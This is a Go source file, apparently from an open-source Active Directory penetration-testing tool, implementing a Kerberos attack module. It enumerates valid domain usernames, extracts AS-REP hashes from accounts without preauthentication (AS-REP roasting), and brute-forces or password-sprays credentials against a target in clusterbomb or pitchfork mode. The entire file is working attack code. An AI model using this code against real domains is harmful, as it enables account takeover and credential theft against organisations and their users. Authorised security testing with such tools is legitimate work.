package goad

import (
	"fmt"
	"sync"

	"github.com/5amu/goad/internal/printer"
	"github.com/5amu/goad/internal/utils"
	"github.com/5amu/goad/pkg/kerberos"
	"github.com/5amu/goad/pkg/smb"
)

type Krb5Options struct {
	Targets struct {
		TARGETS []string `description:"Provide target IP/FQDN/FILE"`
	} `positional-args:"yes"`

	Connection struct {
		Username string `short:"u" description:"Provide username (or FILE)"`
		Password string `short:"p" description:"Provide password (or FILE)"`
		Domain   string `short:"d" long:"domain" description:"Provide domain"`
	} `group:"Connection Options" description:"Connection Options"`

	Mode struct {
		Bruteforce bool `long:"brute" description:"Bruteforce provided user and pass (can be pass spray when only 1 password is specified)"`
		UserEnum   bool `long:"user-enum" description:"enumerate valid usernames via kerberos"`
	} `group:"Attack Mode"`

	BruteforceStrategy struct {
		ClusterBomb bool `long:"clusterbomb" description:"payload sets in clusterbomb mode (default)"`
		Pitchfork   bool `long:"pitchfork" description:"payload sets in pitchfork mode"`
	} `group:"Bruteforce Strategy"`

	targets        []string
	target2SMBInfo map[string]*smb.SMBInfo
	credentials    []utils.Credential
}

func (o *Krb5Options) Run() error {
	for _, t := range o.Targets.TARGETS {
		o.targets = append(o.targets, sliceFromString(t)...)
	}

	o.target2SMBInfo = make(map[string]*smb.SMBInfo)
	for _, t := range o.targets {
		o.target2SMBInfo[t] = getSMBInfo(t)
	}

	if o.BruteforceStrategy.Pitchfork {
		o.credentials = utils.NewCredentialsPitchFork(
			sliceFromString(o.Connection.Username),
			sliceFromString(o.Connection.Password),
		)
	} else {
		o.credentials = utils.NewCredentialsClusterBomb(
			sliceFromString(o.Connection.Username),
			sliceFromString(o.Connection.Password),
		)
	}

	var f func(string) error
	if o.Mode.UserEnum {
		f = o.userenum
	} else if o.Mode.Bruteforce {
		f = o.bruteforce
	} else {
		return fmt.Errorf("nothing to do")
	}

	var wg sync.WaitGroup
	for _, target := range o.targets {
		wg.Add(1)
		go func(t string) {
			if err := f(t); err != nil {
				fmt.Println(err)
			}
			wg.Done()
		}(target)
	}
	wg.Wait()
	return nil
}

func (o *Krb5Options) userenum(target string) error {
	client, err := kerberos.NewKerberosClient(o.Connection.Domain, target)
	if err != nil {
		return err
	}

	prt := printer.NewPrinter("KRB5", target, o.target2SMBInfo[target].NetBIOSName, 88)
	for _, u := range o.credentials {
		if tgs, err := client.GetAsReqTgt(u.Username); err != nil {
			_, ok := err.(*kerberos.ErrorRequiresPreauth)
			if ok {
				prt.PrintSuccess(u.StringWithDomain(o.Connection.Domain), "Requires Preauth")
			} else {
				prt.PrintFailure(u.StringWithDomain(o.Connection.Domain), "Does Not Exist")
			}
		} else {
			hash := tgs.Hash
			prt.PrintSuccess(u.StringWithDomain(o.Connection.Domain), "No Preauth")
			prt.Print(hash)
		}
	}
	return nil
}

func (o *Krb5Options) bruteforce(target string) error {
	client, err := kerberos.NewKerberosClient(o.Connection.Domain, target)
	if err != nil {
		return err
	}

	prt := printer.NewPrinter("KRB5", target, o.target2SMBInfo[target].NetBIOSName, 88)
	for _, u := range o.credentials {
		if ok, _ := client.TestLogin(u.Username, u.Password); ok {
			prt.PrintSuccess(u.StringWithDomain(o.Connection.Domain))
		} else {
			prt.PrintFailure(u.StringWithDomain(o.Connection.Domain))
		}
	}
	return nil
}
